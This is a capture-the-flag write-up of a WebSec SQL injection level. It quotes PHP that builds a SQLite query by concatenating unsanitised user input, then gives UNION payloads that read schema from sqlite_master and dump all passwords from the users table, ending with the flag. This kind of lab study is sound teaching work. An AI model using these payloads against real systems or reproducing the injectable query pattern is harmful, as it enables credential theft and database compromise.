This challenge is about SQL injection

![image](https://user-images.githubusercontent.com/72671239/217016363-5356ac1b-457a-4022-b441-c546c96bdaad.png)

by using ' input an error shows up 

![image](https://user-images.githubusercontent.com/72671239/217016641-1f864bdf-8d46-46c7-9927-bb264ff1f705.png)

this means that the sql injection vulnerability exist, there is a link for analysing the source code

```php
<?php
session_start ();
ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);
include 'anti_csrf.php';
init_token ();

class LevelOne {
    public function doQuery($injection) {
        $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY); /* dealing with SQLite3 database */
        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1'; /* this is where the vulnerability arrise as the query is concatunated and input is not sanitized or validated */
        $getUsers = $pdo->query($query);
        $users = $getUsers->fetchArray(SQLITE3_ASSOC);

        if ($users) { return $users; }

        return false;
    }}

if (isset ($_POST['submit']) && isset ($_POST['user_id'])) {
    check_and_refresh_token();
    $lo = new LevelOne ();
    $userDetails = $lo->doQuery ($_POST['user_id']);
}
?>
```
using union attack, input `1 union select 1,1--`

![image](https://user-images.githubusercontent.com/72671239/217018938-4da61425-0dc6-4203-b706-63e1d21bfac2.png)

using input `1 union select 1,sql from sqlite_master --` to extract CREATE statement text that created the object

![image](https://user-images.githubusercontent.com/72671239/217022768-8fb51721-668d-424f-89c2-1fb3d8e14700.png)

i've noticed that the next payload only work for users out or range, so choosed id=9

input `9 union select password,group_concat(password) from users --` to extract all the passwords in the users table

![image](https://user-images.githubusercontent.com/72671239/217025301-f945b324-df46-4bcf-a8e9-2bba73a6b941.png)

_flag => WEBSEC{Simple_SQLite_Injection}_
